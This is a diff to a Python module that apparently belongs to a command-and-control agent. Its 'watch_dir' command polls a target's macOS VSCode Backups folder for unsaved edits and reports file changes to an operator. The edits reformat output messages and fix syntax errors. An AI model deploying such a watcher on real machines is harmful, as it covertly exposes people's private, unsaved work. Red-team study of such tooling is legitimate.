@@ -59,7 +59,7 @@ watch_dir {path to remote dir} poll_interval
                 for dir in dirs:
                     full_dir_path = os.path.join(root, dir)
                     if full_dir_path not in known_files.keys():
-                        if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] New Directory: {}".format(full_dir_path)	)
+                        if print_out: self.sendTaskOutputUpdate(task_id,"\n\n[*] New Directory: {}".format(full_dir_path)	)
                         known_files[full_dir_path] = ""
 
                 for file in files:
@@ -75,25 +75,25 @@ watch_dir {path to remote dir} poll_interval
 
                     if full_file_path not in known_files.keys() and hash not in known_files.values():
                         if print_out: 
-                            self.sendTaskOutputUpdate(task_id, "\n[*] New File: \n - Backup File: {}".format(full_file_path))
                             original_file_path, size, modified_time = getOriginalFileDetails(full_file_path)
-                            self.sendTaskOutputUpdate(task_id, f" - Original File: {original_file_path} ({size} bytes) - Last Modified: {modified_time}")
+                            self.sendTaskOutputUpdate(task_id,"\n\n[*] New File: \n - Backup File: {} ({} bytes) \n - Original File: {} ({} bytes) - Last Modified: {}".format(
+                                full_file_path, file_size, original_file_path, size, modified_time))
                         known_files[full_file_path] = hash
                     
                     elif full_file_path in known_files.keys() and hash not in known_files.values():
                         if print_out: 
-                            self.sendTaskOutputUpdate(task_id, "\n[*] File Updated: \n - Backup File: {}".format(full_file_path))
                             original_file_path, size, modified_time = getOriginalFileDetails(full_file_path)
-                            self.sendTaskOutputUpdate(task_id, f" - Original File: {original_file_path} ({size} bytes) - Last Modified: {modified_time}") 
+                            self.sendTaskOutputUpdate(task_id,"\n\n[*] File Updated: \n - Backup File: {} ({} bytes) \n - Original File: {} ({} bytes) - Last Modified: {}".format(
+                                full_file_path, file_size, original_file_path, size, modified_time))
 
                         known_files[full_file_path] = hash
                     
                     elif full_file_path not in known_files.keys() and hash in known_files.values():
                         orig_file = [f for f,h in known_files.items() if h == hash][0]
                         if os.path.exists(os.path.join(file_path, orig_file)):
-                            if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] Copied File: {}->{} - {} bytes ({})".format(orig_file, full_file_path, file_size, hash))
+                            if print_out: self.sendTaskOutputUpdate(task_id,"\n\n[*] Copied File: {}->{} - {} bytes ({})".format(orig_file, full_file_path, file_size, hash))
                         else:
-                            if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] Moved File: {}->{} - {} bytes ({})".format(orig_file, full_file_path, file_size, hash))
+                            if print_out: self.sendTaskOutputUpdate(task_id,"\n\n[*] Moved File: {}->{} - {} bytes ({})".format(orig_file, full_file_path, file_size, hash))
                             known_files.pop(orig_file)
                     
                     known_files[full_file_path] = hash
@@ -103,29 +103,29 @@ watch_dir {path to remote dir} poll_interval
                     for del_file in [f for f in list(known_files) if f.startswith(os.path.dirname(file))]:
                         obj_type = "Directory" if not known_files[del_file] else "File"
                         if file in list(known_files):
-                            if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] {} deleted: {} {}".format(obj_type, \
+                            if print_out: self.sendTaskOutputUpdate(task_id,"\n\n[*] {} deleted: {} {}".format(obj_type, \
                                 del_file, "({})".format(known_files[del_file]) if known_files[del_file] else ""))
                             known_files.pop(file)
             
                 else:
                     if os.path.basename(file) not in os.listdir(os.path.dirname(file)):
                         obj_type = "Directory" if not known_files[file] else "File"
-                        if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] {} Deleted: {} {}".format(obj_type, file, \
+                        if print_out: self.sendTaskOutputUpdate(task_id,"\n\n[*] {} Deleted: {} {}".format(obj_type, file, \
                             "({})".format(known_files[file]) if known_files[file] else ""))
                         known_files.pop(file)
 
         path = backups_path if backups_path else "/Users/{}/Library/Application Support/Code/Backups".format(os.environ["USER"])
 
         if not os.path.isdir(path):
-            return "[!] Path must be a valid directory")
+            return "[!] Path must be a valid directory"
         elif not os.access(path, os.R_OK):
-            return "[!] Path not accessible")
+            return "[!] Path not accessible"
         else:
-            self.sendTaskOutputUpdate(task_id, "[*] Watching for VSCode unsaved edits in {}".format(path))
+            self.sendTaskOutputUpdate(task_id, "[*] Starting directory watch for {}".format(path))
             diffFolder(path, False) 
             while(True):
                 if not os.path.exists(path):
-                    return  "[!] Root directory has been deleted." )
+                    return  "[!] Root directory has been deleted."
                 diffFolder(path)
                 time.sleep(seconds)
 
